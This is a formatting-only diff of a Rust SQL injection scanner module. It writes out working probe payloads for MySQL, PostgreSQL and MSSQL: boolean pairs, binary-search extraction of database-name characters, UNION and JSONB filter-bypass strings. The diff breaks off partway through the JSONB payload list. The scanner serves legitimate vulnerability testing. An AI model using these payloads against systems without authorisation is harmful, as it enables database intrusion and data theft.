@@ -9,12 +9,16 @@
  * @copyright 2026 Bountyy Oy
  * @license Proprietary
  */
-
-use crate::analysis::{HypothesisEngine, Hypothesis, HypothesisType, HypothesisStatus, Evidence, EvidenceType, ResponseHints};
+use crate::analysis::{
+    Evidence, EvidenceType, Hypothesis, HypothesisEngine, HypothesisStatus, HypothesisType,
+    ResponseHints,
+};
 use crate::http_client::{HttpClient, HttpResponse};
 use crate::payloads;
 use crate::scanners::parameter_filter::{ParameterFilter, ScannerType};
-use crate::types::{Confidence, EndpointType, ParameterSource, ScanConfig, ScanContext, Severity, Vulnerability};
+use crate::types::{
+    Confidence, EndpointType, ParameterSource, ScanConfig, ScanContext, Severity, Vulnerability,
+};
 use crate::vulnerability::VulnerabilityDetector;
 use anyhow::Result;
 use futures::stream::{self, StreamExt};
@@ -39,12 +43,12 @@ pub enum DatabaseType {
 /// Injection context detected from parameter analysis
 #[derive(Debug, Clone, PartialEq)]
 pub enum InjectionContext {
-    Numeric,          // id=123
-    String,           // name='value'
-    DoubleQuote,      // value="test"
-    Json,             // {"key":"value"}
-    OrderBy,          // sort=column
-    Limit,            // limit=10
+    Numeric,     // id=123
+    String,      // name='value'
+    DoubleQuote, // value="test"
+    Json,        // {"key":"value"}
+    OrderBy,     // sort=column
+    Limit,       // limit=10
     Unknown,
 }
 
@@ -122,16 +126,20 @@ impl EnhancedSqliScanner {
             return Ok((Vec::new(), 0));
         }
 
-        debug!("Testing parameter '{}' for SQL injection (unified scanner, priority: {}{})",
-              parameter,
-              ParameterFilter::get_parameter_priority(parameter),
-              if let Some(ctx) = context {
-                  format!(", framework: {:?}, source: {:?}",
-                          ctx.framework.as_deref().unwrap_or("Unknown"),
-                          ctx.parameter_source)
-              } else {
-                  String::new()
-              });
+        debug!(
+            "Testing parameter '{}' for SQL injection (unified scanner, priority: {}{})",
+            parameter,
+            ParameterFilter::get_parameter_priority(parameter),
+            if let Some(ctx) = context {
+                format!(
+                    ", framework: {:?}, source: {:?}",
+                    ctx.framework.as_deref().unwrap_or("Unknown"),
+                    ctx.parameter_source
+                )
+            } else {
+                String::new()
+            }
+        );
 
         let mut all_vulnerabilities = Vec::new();
         let mut total_tests = 0;
@@ -152,7 +160,9 @@ impl EnhancedSqliScanner {
 
         // Detect database type and injection context
         let db_type = self.detect_database_type(&baseline).await;
-        let injection_context = self.detect_injection_context(base_url, parameter, &baseline).await;
+        let injection_context = self
+            .detect_injection_context(base_url, parameter, &baseline)
+            .await;
 
         debug!(
             "Context analysis: DB={:?}, InjectionContext={:?}",
@@ -172,7 +182,9 @@ impl EnhancedSqliScanner {
         let mut hypothesis_engine = HypothesisEngine::new();
 
         // Extract parameter value from URL for hypothesis generation
-        let param_value = self.extract_param_value(base_url, parameter).unwrap_or_default();
+        let param_value = self
+            .extract_param_value(base_url, parameter)
+            .unwrap_or_default();
 
         // Build response hints from baseline analysis
         let response_hints = ResponseHints {
@@ -205,7 +217,8 @@ impl EnhancedSqliScanner {
             "[SQLi] Generated {} hypotheses for parameter '{}' (SQLi prior: {:.2})",
             hypotheses.len(),
             parameter,
-            hypotheses.iter()
+            hypotheses
+                .iter()
                 .find(|h| matches!(h.hypothesis_type, HypothesisType::SqlInjection { .. }))
                 .map(|h| h.posterior_probability)
                 .unwrap_or(0.0)
@@ -213,13 +226,20 @@ impl EnhancedSqliScanner {
 
         // Run hypothesis-guided testing before traditional scanning
         let (hypothesis_vulns, hypothesis_tests) = self
-            .scan_hypothesis_guided(base_url, parameter, &baseline, &mut hypothesis_engine, config)
+            .scan_hypothesis_guided(
+                base_url,
+                parameter,
+                &baseline,
+                &mut hypothesis_engine,
+                config,
+            )
             .await?;
         total_tests += hypothesis_tests;
         all_vulnerabilities.extend(hypothesis_vulns);
 
         // If hypothesis testing found high-confidence vulnerabilities, we can skip some techniques
-        let skip_redundant_tests = hypothesis_engine.get_confirmed_hypotheses()
+        let skip_redundant_tests = hypothesis_engine
+            .get_confirmed_hypotheses()
             .iter()
             .any(|h| matches!(h.hypothesis_type, HypothesisType::SqlInjection { .. }));
 
@@ -234,7 +254,15 @@ impl EnhancedSqliScanner {
 
         // Technique 1: Error-based detection (fast, high confidence)
         let (error_vulns, error_tests) = self
-            .scan_error_based(base_url, parameter, &baseline, &db_type, &injection_context, config, context)
+            .scan_error_based(
+                base_url,
+                parameter,
+                &baseline,
+                &db_type,
+                &injection_context,
+                config,
+                context,
+            )
             .await?;
         total_tests += error_tests;
         all_vulnerabilities.extend(error_vulns);
@@ -246,7 +274,14 @@ impl EnhancedSqliScanner {
 
         // Technique 2: Boolean-based blind SQLi (slower, reliable)
         let (boolean_vulns, boolean_tests) = self
-            .scan_boolean_blind(base_url, parameter, &baseline, &db_type, &injection_context, config)
+            .scan_boolean_blind(
+                base_url,
+                parameter,
+                &baseline,
+                &db_type,
+                &injection_context,
+                config,
+            )
             .await?;
         total_tests += boolean_tests;
         all_vulnerabilities.extend(boolean_vulns);
@@ -257,7 +292,14 @@ impl EnhancedSqliScanner {
 
         // Technique 3: UNION-based SQLi (data extraction)
         let (union_vulns, union_tests) = self
-            .scan_union_based(base_url, parameter, &baseline, &db_type, &injection_context, config)
+            .scan_union_based(
+                base_url,
+                parameter,
+                &baseline,
+                &db_type,
+                &injection_context,
+                config,
+            )
             .await?;
         total_tests += union_tests;
         all_vulnerabilities.extend(union_vulns);
@@ -277,22 +319,43 @@ impl EnhancedSqliScanner {
         if config.scan_mode.as_str() == "thorough" || config.scan_mode.as_str() == "insane" {
             // Technique 5: Binary search blind SQLi
             let (binary_vulns, binary_tests) = self
-                .scan_binary_search_blind(base_url, parameter, &baseline, &db_type, &injection_context, config)
+                .scan_binary_search_blind(
+                    base_url,
+                    parameter,
+                    &baseline,
+                    &db_type,
+                    &injection_context,
+                    config,
+                )
                 .await?;
             total_tests += binary_tests;
             all_vulnerabilities.extend(binary_vulns);
 
             // Technique 6: Time-based with statistical analysis
             let (stat_time_vulns, stat_time_tests) = self
-                .scan_time_based_statistical(base_url, parameter, &db_type, &injection_context, config)
+                .scan_time_based_statistical(
+                    base_url,
+                    parameter,
+                    &db_type,
+                    &injection_context,
+                    config,
+                )
                 .await?;
             total_tests += stat_time_tests;
             all_vulnerabilities.extend(stat_time_vulns);
 
             // Technique 7: PostgreSQL JSON operators (if PostgreSQL detected)
-            if matches!(db_type, DatabaseType::PostgreSQL) || matches!(db_type, DatabaseType::Generic) {
+            if matches!(db_type, DatabaseType::PostgreSQL)
+                || matches!(db_type, DatabaseType::Generic)
+            {
                 let (json_vulns, json_tests) = self
-                    .scan_postgres_json_operators(base_url, parameter, &baseline, &injection_context, config)
+                    .scan_postgres_json_operators(
+                        base_url,
+                        parameter,
+                        &baseline,
+                        &injection_context,
+                        config,
+                    )
                     .await?;
                 total_tests += json_tests;
                 all_vulnerabilities.extend(json_vulns);
@@ -300,7 +363,14 @@ impl EnhancedSqliScanner {
 
             // Technique 8: Enhanced error-based SQLi
             let (enhanced_error_vulns, enhanced_error_tests) = self
-                .scan_enhanced_error_based(base_url, parameter, &baseline, &db_type, &injection_context, config)
+                .scan_enhanced_error_based(
+                    base_url,
+                    parameter,
+                    &baseline,
+                    &db_type,
+                    &injection_context,
+                    config,
+                )
                 .await?;
             total_tests += enhanced_error_tests;
             all_vulnerabilities.extend(enhanced_error_vulns);
@@ -355,7 +425,7 @@ impl EnhancedSqliScanner {
                 async move {
                     let test_body = body.replace(
                         &format!("\"{}\":", param),
-                        &format!("\"{}\":\"{}\"", param, payload)
+                        &format!("\"{}\":\"{}\"", param, payload),
                     );
 
                     match client.post(&url, test_body.clone()).await {
@@ -373,15 +443,15 @@ impl EnhancedSqliScanner {
 
         for result in results {
             if let Some((payload, response, test_url, baseline)) = result {
-                if let Some(vuln) = self.detector.detect_sqli(
-                    &test_url,
-                    body_param,
-                    &payload,
-                    &response,
-                    &baseline,
-                ) {
+                if let Some(vuln) = self
+                    .detector
+                    .detect_sqli(&test_url, body_param, &payload, &response, &baseline)
+                {
                     if self.is_new_vulnerability(&vuln) {
-                        info!("SQL injection in POST body: {} in parameter '{}'", vuln.severity, body_param);
+                        info!(
+                            "SQL injection in POST body: {} in parameter '{}'",
+                            vuln.severity, body_param
+                        );
                         vulnerabilities.push(vuln);
                     }
                 }
@@ -517,9 +587,9 @@ impl EnhancedSqliScanner {
         // Test ORDER BY injection by comparing responses
         // Valid ORDER BY returns 200, invalid column number returns 500
         let test_payloads = [
-            ("1--", true),      // Should succeed (column 1 usually exists)
-            ("9999--", false),  // Should fail (column 9999 unlikely to exist)
-            ("1'--", false),    // String injection attempt - different error
+            ("1--", true),     // Should succeed (column 1 usually exists)
+            ("9999--", false), // Should fail (column 9999 unlikely to exist)
+            ("1'--", false),   // String injection attempt - different error
         ];
 
         let baseline_status = baseline.status_code;
@@ -562,7 +632,11 @@ impl EnhancedSqliScanner {
     }
 
     /// Get context-aware payloads based on detected database and injection context
-    fn get_context_aware_payloads(&self, db_type: &DatabaseType, context: &InjectionContext) -> Vec<String> {
+    fn get_context_aware_payloads(
+        &self,
+        db_type: &DatabaseType,
+        context: &InjectionContext,
+    ) -> Vec<String> {
         let mut payloads = Vec::new();
 
         match context {
@@ -744,15 +818,15 @@ impl EnhancedSqliScanner {
 
         for result in results {
             if let Some((payload, response, test_url, baseline)) = result {
-                if let Some(vuln) = self.detector.detect_sqli(
-                    &test_url,
-                    parameter,
-                    &payload,
-                    &response,
-                    &baseline,
-                ) {
+                if let Some(vuln) = self
+                    .detector
+                    .detect_sqli(&test_url, parameter, &payload, &response, &baseline)
+                {
                     if self.is_new_vulnerability(&vuln) {
-                        info!("Error-based SQLi detected: {} in parameter '{}'", vuln.severity, parameter);
+                        info!(
+                            "Error-based SQLi detected: {} in parameter '{}'",
+                            vuln.severity, parameter
+                        );
                         vulnerabilities.push(vuln);
 
                         if config.scan_mode.as_str() == "fast" {
@@ -788,15 +862,35 @@ impl EnhancedSqliScanner {
             }
 
             let true_url = if url.contains('?') {
-                format!("{}&{}={}", url, param, urlencoding::encode(pair.true_payload))
+                format!(
+                    "{}&{}={}",
+                    url,
+                    param,
+                    urlencoding::encode(pair.true_payload)
+                )
             } else {
-                format!("{}?{}={}", url, param, urlencoding::encode(pair.true_payload))
+                format!(
+                    "{}?{}={}",
+                    url,
+                    param,
+                    urlencoding::encode(pair.true_payload)
+                )
             };
 
             let false_url = if url.contains('?') {
-                format!("{}&{}={}", url, param, urlencoding::encode(pair.false_payload))
+                format!(
+                    "{}&{}={}",
+                    url,
+                    param,
+                    urlencoding::encode(pair.false_payload)
+                )
             } else {
-                format!("{}?{}={}", url, param, urlencoding::encode(pair.false_payload))
+                format!(
+                    "{}?{}={}",
+                    url,
+                    param,
+                    urlencoding::encode(pair.false_payload)
+                )
             };
 
             let true_response = match self.http_client.get(&true_url).await {
@@ -827,7 +921,9 @@ impl EnhancedSqliScanner {
                     info!("Boolean-based blind SQLi detected: {:?}", pair.db_type);
                     vulnerabilities.push(vuln);
 
-                    if config.scan_mode.as_str() != "thorough" && config.scan_mode.as_str() != "insane" {
+                    if config.scan_mode.as_str() != "thorough"
+                        && config.scan_mode.as_str() != "insane"
+                    {
                         break;
                     }
                 }
@@ -838,7 +934,11 @@ impl EnhancedSqliScanner {
     }
 
     /// Get boolean payload pairs based on context
-    fn get_boolean_payload_pairs(&self, db_type: &DatabaseType, context: &InjectionContext) -> Vec<BooleanPayloadPair> {
+    fn get_boolean_payload_pairs(
+        &self,
+        db_type: &DatabaseType,
+        context: &InjectionContext,
+    ) -> Vec<BooleanPayloadPair> {
         let mut pairs = Vec::new();
 
         match context {
@@ -953,9 +1053,8 @@ impl EnhancedSqliScanner {
         let false_differs_from_baseline = false_to_baseline < 0.70;
         let true_differs_from_false = true_to_false < 0.70;
 
-        let is_vulnerable = true_matches_baseline
-            && false_differs_from_baseline
-            && true_differs_from_false;
+        let is_vulnerable =
+            true_matches_baseline && false_differs_from_baseline && true_differs_from_false;
 
         if is_vulnerable {
             let confidence = if true_to_baseline > 0.95 && false_to_baseline < 0.50 {
@@ -980,34 +1079,45 @@ impl EnhancedSqliScanner {
                 pair.description
             );
 
-            Some(Vulnerability {
-                id: format!("sqli_boolean_{}", Self::generate_id()),
-                vuln_type: "Boolean-based Blind SQL Injection".to_string(),
-                severity: Severity::Critical,
-                confidence,
-                category: "Injection".to_string(),
-                url: url.to_string(),
-                parameter: Some(param.to_string()),
-                payload: format!("TRUE: {} | FALSE: {}", pair.true_payload, pair.false_payload),
-                description: format!(
-                    "Boolean-based blind SQL injection in parameter '{}'. Database: {:?}. \
+            Some(
+                Vulnerability {
+                    id: format!("sqli_boolean_{}", Self::generate_id()),
+                    vuln_type: "Boolean-based Blind SQL Injection".to_string(),
+                    severity: Severity::Critical,
+                    confidence,
+                    category: "Injection".to_string(),
+                    url: url.to_string(),
+                    parameter: Some(param.to_string()),
+                    payload: format!(
+                        "TRUE: {} | FALSE: {}",
+                        pair.true_payload, pair.false_payload
+                    ),
+                    description: format!(
+                        "Boolean-based blind SQL injection in parameter '{}'. Database: {:?}. \
                     Allows byte-by-byte data extraction through boolean logic.",
-                    param, pair.db_type
-                ),
-                evidence: Some(evidence),
-                cwe: "CWE-89".to_string(),
-                cvss: 9.8,
-                verified: true,
-                false_positive: false,
-                remediation: "1. Use parameterized queries exclusively\n\
+                        param, pair.db_type
+                    ),
+                    evidence: Some(evidence),
+                    cwe: "CWE-89".to_string(),
+                    cvss: 9.8,
+                    verified: true,
+                    false_positive: false,
+                    remediation: "1. Use parameterized queries exclusively\n\
                               2. Implement strict input validation\n\
                               3. Apply principle of least privilege\n\
                               4. Use ORM with built-in protection\n\
                               5. Enable WAF rules\n\
-                              6. Monitor database queries".to_string(),
-                discovered_at: chrono::Utc::now().to_rfc3339(),
-                ml_data: None,
-            }.with_ml_data(true_response, Some(baseline), Some(pair.true_payload)))
+                              6. Monitor database queries"
+                        .to_string(),
+                    discovered_at: chrono::Utc::now().to_rfc3339(),
+                    ml_data: None,
+                }
+                .with_ml_data(
+                    true_response,
+                    Some(baseline),
+                    Some(pair.true_payload),
+                ),
+            )
         } else {
             None
         }
@@ -1049,7 +1159,14 @@ impl EnhancedSqliScanner {
                 info!("Detected {} columns using ORDER BY", column_count);
 
                 if let Some(vuln) = self
-                    .test_union_injection(url, param, column_count, terminator, baseline, &mut tests_run)
+                    .test_union_injection(
+                        url,
+                        param,
+                        column_count,
+                        terminator,
+                        baseline,
+                        &mut tests_run,
+                    )
                     .await
                 {
                     if self.is_new_vulnerability(&vuln) {
@@ -1066,7 +1183,14 @@ impl EnhancedSqliScanner {
                     info!("Detected {} columns using UNION SELECT", column_count);
 
                     if let Some(vuln) = self
-                        .test_union_injection(url, param, column_count, terminator, baseline, &mut tests_run)
+                        .test_union_injection(
+                            url,
+                            param,
+                            column_count,
+                            terminator,
+                            baseline,
+                            &mut tests_run,
+                        )
                         .await
                     {
                         if self.is_new_vulnerability(&vuln) {
@@ -1195,36 +1319,47 @@ impl EnhancedSqliScanner {
                 if self.is_successful_injection(&response, baseline) {
                     let evidence = format!(
                         "Column count: {}\nTerminator: {}\nStatus: {}\nSize: {} bytes",
-                        column_count, terminator, response.status_code, response.body.len()
+                        column_count,
+                        terminator,
+                        response.status_code,
+                        response.body.len()
                     );
 
-                    return Some(Vulnerability {
-                        id: format!("sqli_union_{}", Self::generate_id()),
-                        vuln_type: "UNION-based SQL Injection".to_string(),
-                        severity: Severity::Critical,
-                        confidence: Confidence::High,
-                        category: "Injection".to_string(),
-                        url: url.to_string(),
-                        parameter: Some(param.to_string()),
-                        payload: payload.clone(),
-                        description: format!(
+                    return Some(
+                        Vulnerability {
+                            id: format!("sqli_union_{}", Self::generate_id()),
+                            vuln_type: "UNION-based SQL Injection".to_string(),
+                            severity: Severity::Critical,
+                            confidence: Confidence::High,
+                            category: "Injection".to_string(),
+                            url: url.to_string(),
+                            parameter: Some(param.to_string()),
+                            payload: payload.clone(),
+                            description: format!(
                             "UNION-based SQL injection in parameter '{}'. {} columns detected. \
                             Allows direct data extraction from database.",
                             param, column_count
                         ),
-                        evidence: Some(evidence),
-                        cwe: "CWE-89".to_string(),
-                        cvss: 9.8,
-                        verified: true,
-                        false_positive: false,
-                        remediation: "1. Use parameterized queries\n\
+                            evidence: Some(evidence),
+                            cwe: "CWE-89".to_string(),
+                            cvss: 9.8,
+                            verified: true,
+                            false_positive: false,
+                            remediation: "1. Use parameterized queries\n\
                                       2. Implement input validation\n\
                                       3. Apply least privilege\n\
                                       4. Disable detailed errors\n\
-                                      5. Use WAF rules".to_string(),
-                        discovered_at: chrono::Utc::now().to_rfc3339(),
-                        ml_data: None,
-                    }.with_ml_data(&response, Some(baseline), Some(&payload)));
+                                      5. Use WAF rules"
+                                .to_string(),
+                            discovered_at: chrono::Utc::now().to_rfc3339(),
+                            ml_data: None,
+                        }
+                        .with_ml_data(
+                            &response,
+                            Some(baseline),
+                            Some(&payload),
+                        ),
+                    );
                 }
             }
             Err(_) => {}
@@ -1277,9 +1412,19 @@ impl EnhancedSqliScanner {
             }
 
             let test_url = if base_url.contains('?') {
-                format!("{}&{}={}", base_url, parameter, urlencoding::encode(payload))
+                format!(
+                    "{}&{}={}",
+                    base_url,
+                    parameter,
+                    urlencoding::encode(payload)
+                )
             } else {
-                format!("{}?{}={}", base_url, parameter, urlencoding::encode(payload))
+                format!(
+                    "{}?{}={}",
+                    base_url,
+                    parameter,
+                    urlencoding::encode(payload)
+                )
             };
 
             tests_run += 1;
@@ -1319,7 +1464,10 @@ impl EnhancedSqliScanner {
                         }.with_ml_data(&response, None, Some(payload));
 
                         if self.is_new_vulnerability(&vuln) {
-                            info!("Time-based blind SQLi detected: {}ms delay", response.duration_ms);
+                            info!(
+                                "Time-based blind SQLi detected: {}ms delay",
+                                response.duration_ms
+                            );
                             vulnerabilities.push(vuln);
                         }
                     }
@@ -1352,7 +1500,8 @@ impl EnhancedSqliScanner {
             min_len / max_len
         };
 
-        let content_similarity = self.calculate_content_similarity(&response_a.body, &response_b.body);
+        let content_similarity =
+            self.calculate_content_similarity(&response_a.body, &response_b.body);
 
         (status_similarity * 0.25) + (length_similarity * 0.25) + (content_similarity * 0.50)
     }
@@ -1366,8 +1515,16 @@ impl EnhancedSqliScanner {
             return 0.0;
         }
 
-        let sample_a = if text_a.len() > 5000 { &text_a[..5000] } else { text_a };
-        let sample_b = if text_b.len() > 5000 { &text_b[..5000] } else { text_b };
+        let sample_a = if text_a.len() > 5000 {
+            &text_a[..5000]
+        } else {
+            text_a
+        };
+        let sample_b = if text_b.len() > 5000 {
+            &text_b[..5000]
+        } else {
+            text_b
+        };
 
         let matches = sample_a
             .chars()
@@ -1405,7 +1562,9 @@ impl EnhancedSqliScanner {
             "wrong number of columns",
         ];
 
-        error_patterns.iter().any(|pattern| body_lower.contains(pattern))
+        error_patterns
+            .iter()
+            .any(|pattern| body_lower.contains(pattern))
     }
 
     /// Check if injection was successful
@@ -1494,7 +1653,10 @@ impl EnhancedSqliScanner {
 
             // Verify boolean logic works
             if true_similarity > 0.85 && false_similarity < 0.70 {
-                info!("Boolean logic verified, testing binary search extraction for {}", db_name);
+                info!(
+                    "Boolean logic verified, testing binary search extraction for {}",
+                    db_name
+                );
 
                 // Attempt to extract first character of database name using binary search
                 if let Some((extracted_char, search_tests)) = self
@@ -1561,64 +1723,62 @@ impl EnhancedSqliScanner {
     }
 
     /// Get verification payloads for binary search
-    fn get_binary_search_verification_payloads(&self, db_type: &DatabaseType, context: &InjectionContext) -> Vec<(&'static str, &'static str, &'static str)> {
+    fn get_binary_search_verification_payloads(
+        &self,
+        db_type: &DatabaseType,
+        context: &InjectionContext,
+    ) -> Vec<(&'static str, &'static str, &'static str)> {
         let mut payloads = Vec::new();
 
         match db_type {
-            DatabaseType::MySQL => {
-                match context {
-                    InjectionContext::Numeric => {
-                        payloads.push((
-                            " AND ASCII(SUBSTRING(DATABASE(),1,1))>0",
-                            " AND ASCII(SUBSTRING(DATABASE(),1,1))>255",
-                            "MySQL"
-                        ));
-                    }
-                    _ => {
-                        payloads.push((
-                            "' AND ASCII(SUBSTRING(DATABASE(),1,1))>0 AND '1'='1",
-                            "' AND ASCII(SUBSTRING(DATABASE(),1,1))>255 AND '1'='1",
-                            "MySQL"
-                        ));
-                    }
+            DatabaseType::MySQL => match context {
+                InjectionContext::Numeric => {
+                    payloads.push((
+                        " AND ASCII(SUBSTRING(DATABASE(),1,1))>0",
+                        " AND ASCII(SUBSTRING(DATABASE(),1,1))>255",
+                        "MySQL",
+                    ));
                 }
-            }
-            DatabaseType::PostgreSQL => {
-                match context {
-                    InjectionContext::Numeric => {
-                        payloads.push((
-                            " AND ASCII(SUBSTRING(current_database(),1,1))>0",
-                            " AND ASCII(SUBSTRING(current_database(),1,1))>255",
-                            "PostgreSQL"
-                        ));
-                    }
-                    _ => {
-                        payloads.push((
-                            "' AND ASCII(SUBSTRING(current_database(),1,1))>0 AND '1'='1",
-                            "' AND ASCII(SUBSTRING(current_database(),1,1))>255 AND '1'='1",
-                            "PostgreSQL"
-                        ));
-                    }
+                _ => {
+                    payloads.push((
+                        "' AND ASCII(SUBSTRING(DATABASE(),1,1))>0 AND '1'='1",
+                        "' AND ASCII(SUBSTRING(DATABASE(),1,1))>255 AND '1'='1",
+                        "MySQL",
+                    ));
                 }
-            }
-            DatabaseType::MSSQL => {
-                match context {
-                    InjectionContext::Numeric => {
-                        payloads.push((
-                            " AND ASCII(SUBSTRING(DB_NAME(),1,1))>0",
-                            " AND ASCII(SUBSTRING(DB_NAME(),1,1))>255",
-                            "MSSQL"
-                        ));
-                    }
-                    _ => {
-                        payloads.push((
-                            "' AND ASCII(SUBSTRING(DB_NAME(),1,1))>0 AND '1'='1",
-                            "' AND ASCII(SUBSTRING(DB_NAME(),1,1))>255 AND '1'='1",
-                            "MSSQL"
-                        ));
-                    }
+            },
+            DatabaseType::PostgreSQL => match context {
+                InjectionContext::Numeric => {
+                    payloads.push((
+                        " AND ASCII(SUBSTRING(current_database(),1,1))>0",
+                        " AND ASCII(SUBSTRING(current_database(),1,1))>255",
+                        "PostgreSQL",
+                    ));
                 }
-            }
+                _ => {
+                    payloads.push((
+                        "' AND ASCII(SUBSTRING(current_database(),1,1))>0 AND '1'='1",
+                        "' AND ASCII(SUBSTRING(current_database(),1,1))>255 AND '1'='1",
+                        "PostgreSQL",
+                    ));
+                }
+            },
+            DatabaseType::MSSQL => match context {
+                InjectionContext::Numeric => {
+                    payloads.push((
+                        " AND ASCII(SUBSTRING(DB_NAME(),1,1))>0",
+                        " AND ASCII(SUBSTRING(DB_NAME(),1,1))>255",
+                        "MSSQL",
+                    ));
+                }
+                _ => {
+                    payloads.push((
+                        "' AND ASCII(SUBSTRING(DB_NAME(),1,1))>0 AND '1'='1",
+                        "' AND ASCII(SUBSTRING(DB_NAME(),1,1))>255 AND '1'='1",
+                        "MSSQL",
+                    ));
+                }
+            },
             _ => {
                 // Generic approach - try MySQL syntax
                 match context {
@@ -1626,14 +1786,14 @@ impl EnhancedSqliScanner {
                         payloads.push((
                             " AND ASCII(SUBSTRING(DATABASE(),1,1))>0",
                             " AND ASCII(SUBSTRING(DATABASE(),1,1))>255",
-                            "Generic"
+                            "Generic",
                         ));
                     }
                     _ => {
                         payloads.push((
                             "' AND ASCII(SUBSTRING(DATABASE(),1,1))>0 AND '1'='1",
                             "' AND ASCII(SUBSTRING(DATABASE(),1,1))>255 AND '1'='1",
-                            "Generic"
+                            "Generic",
                         ));
                     }
                 }
@@ -1698,50 +1858,72 @@ impl EnhancedSqliScanner {
     }
 
     /// Build binary search payload
-    fn build_binary_search_payload(&self, db_type: &DatabaseType, context: &InjectionContext, position: usize, ascii_threshold: u8) -> String {
+    fn build_binary_search_payload(
+        &self,
+        db_type: &DatabaseType,
+        context: &InjectionContext,
+        position: usize,
+        ascii_threshold: u8,
+    ) -> String {
         let comparison = format!(">={}", ascii_threshold);
 
         match db_type {
-            DatabaseType::MySQL => {
-                match context {
-                    InjectionContext::Numeric => {
-                        format!(" AND ASCII(SUBSTRING(DATABASE(),{},1)){}", position, comparison)
-                    }
-                    _ => {
-                        format!("' AND ASCII(SUBSTRING(DATABASE(),{},1)){} AND '1'='1", position, comparison)
-                    }
+            DatabaseType::MySQL => match context {
+                InjectionContext::Numeric => {
+                    format!(
+                        " AND ASCII(SUBSTRING(DATABASE(),{},1)){}",
+                        position, comparison
+                    )
                 }
-            }
-            DatabaseType::PostgreSQL => {
-                match context {
-                    InjectionContext::Numeric => {
-                        format!(" AND ASCII(SUBSTRING(current_database(),{},1)){}", position, comparison)
-                    }
-                    _ => {
-                        format!("' AND ASCII(SUBSTRING(current_database(),{},1)){} AND '1'='1", position, comparison)
-                    }
+                _ => {
+                    format!(
+                        "' AND ASCII(SUBSTRING(DATABASE(),{},1)){} AND '1'='1",
+                        position, comparison
+                    )
                 }
-            }
-            DatabaseType::MSSQL => {
-                match context {
-                    InjectionContext::Numeric => {
-                        format!(" AND ASCII(SUBSTRING(DB_NAME(),{},1)){}", position, comparison)
-                    }
-                    _ => {
-                        format!("' AND ASCII(SUBSTRING(DB_NAME(),{},1)){} AND '1'='1", position, comparison)
-                    }
+            },
+            DatabaseType::PostgreSQL => match context {
+                InjectionContext::Numeric => {
+                    format!(
+                        " AND ASCII(SUBSTRING(current_database(),{},1)){}",
+                        position, comparison
+                    )
                 }
-            }
-            _ => {
-                match context {
-                    InjectionContext::Numeric => {
-                        format!(" AND ASCII(SUBSTRING(DATABASE(),{},1)){}", position, comparison)
-                    }
-                    _ => {
-                        format!("' AND ASCII(SUBSTRING(DATABASE(),{},1)){} AND '1'='1", position, comparison)
-                    }
+                _ => {
+                    format!(
+                        "' AND ASCII(SUBSTRING(current_database(),{},1)){} AND '1'='1",
+                        position, comparison
+                    )
                 }
-            }
+            },
+            DatabaseType::MSSQL => match context {
+                InjectionContext::Numeric => {
+                    format!(
+                        " AND ASCII(SUBSTRING(DB_NAME(),{},1)){}",
+                        position, comparison
+                    )
+                }
+                _ => {
+                    format!(
+                        "' AND ASCII(SUBSTRING(DB_NAME(),{},1)){} AND '1'='1",
+                        position, comparison
+                    )
+                }
+            },
+            _ => match context {
+                InjectionContext::Numeric => {
+                    format!(
+                        " AND ASCII(SUBSTRING(DATABASE(),{},1)){}",
+                        position, comparison
+                    )
+                }
+                _ => {
+                    format!(
+                        "' AND ASCII(SUBSTRING(DATABASE(),{},1)){} AND '1'='1",
+                        position, comparison
+                    )
+                }
+            },
         }
     }
 
@@ -1782,7 +1964,10 @@ impl EnhancedSqliScanner {
             let baseline_variance = self.calculate_variance(&baseline_times, baseline_avg);
             let baseline_stddev = baseline_variance.sqrt();
 
-            debug!("Baseline: avg={:.1}ms, stddev={:.1}ms", baseline_avg, baseline_stddev);
+            debug!(
+                "Baseline: avg={:.1}ms, stddev={:.1}ms",
+                baseline_avg, baseline_stddev
+            );
 
             // Test delay payload (3 samples for statistical significance)
             let mut delay_times = Vec::new();
@@ -1809,7 +1994,10 @@ impl EnhancedSqliScanner {
             let delay_variance = self.calculate_variance(&delay_times, delay_avg);
             let delay_stddev = delay_variance.sqrt();
 
-            debug!("Delay: avg={:.1}ms, stddev={:.1}ms", delay_avg, delay_stddev);
+            debug!(
+                "Delay: avg={:.1}ms, stddev={:.1}ms",
+                delay_avg, delay_stddev
+            );
 
             // Statistical analysis
             let delay_difference = delay_avg - baseline_avg;
@@ -1858,7 +2046,13 @@ impl EnhancedSqliScanner {
                     expected_delay,
                     variance_ratio,
                     db_type,
-                    if variance_ratio < 10.0 { "Excellent" } else if variance_ratio < 15.0 { "Good" } else { "Acceptable" }
+                    if variance_ratio < 10.0 {
+                        "Excellent"
+                    } else if variance_ratio < 15.0 {
+                        "Good"
+                    } else {
+                        "Acceptable"
+                    }
                 );
 
                 let vuln = Vulnerability {
@@ -1934,7 +2128,8 @@ impl EnhancedSqliScanner {
             return 0.0;
         }
 
-        let sum_squared_diff: f64 = values.iter()
+        let sum_squared_diff: f64 = values
+            .iter()
             .map(|&value| {
                 let diff = value - mean;
                 diff * diff
@@ -1961,21 +2156,33 @@ impl EnhancedSqliScanner {
         // PostgreSQL JSON operator payloads
         let json_payloads = vec![
             // JSONB containment operators
-            ("' OR '{\"a\":\"b\"}'::jsonb @> '{\"a\":\"b\"}'::jsonb--", "JSONB containment (@>)"),
-            ("' AND '{\"a\":\"b\"}'::jsonb <@ '{\"a\":\"b\"}'::jsonb--", "JSONB contained by (<@)"),
+            (
+                "' OR '{\"a\":\"b\"}'::jsonb @> '{\"a\":\"b\"}'::jsonb--",
+                "JSONB containment (@>)",
+            ),
+            (
+                "' AND '{\"a\":\"b\"}'::jsonb <@ '{\"a\":\"b\"}'::jsonb--",
+                "JSONB contained by (<@)",
+            ),
             ("' OR '{\"a\":1}'::jsonb ? 'a'--", "JSONB key exists (?)"),
-
             // JSON path queries
             ("' OR '{}' IS JSON--", "JSON validation"),
-            ("' AND jsonb_path_query('[1,2,3]'::jsonb, '$[*]') IS NOT NULL--", "JSONB path query"),
-
+            (
+                "' AND jsonb_path_query('[1,2,3]'::jsonb, '$[*]') IS NOT NULL--",
+                "JSONB path query",
+            ),
             // Bypass filters with JSON casting
             ("' OR 1::text::jsonb IS NOT NULL--", "Type casting bypass"),
-            ("' UNION SELECT NULL,NULL,'{\"key\":\"value\"}'::jsonb--", "UNION with JSONB"),
-
+            (
+                "' UNION SELECT NULL,NULL,'{\"key\":\"value\"}'::jsonb--",
+                "UNION with JSONB",
+            ),
             // JSON aggregation
             ("' OR json_agg(1) IS NOT NULL--", "JSON aggregation"),
-            ("' AND jsonb_object_agg('k','v') IS NOT NULL--", "JSONB object aggregation"),
+            (
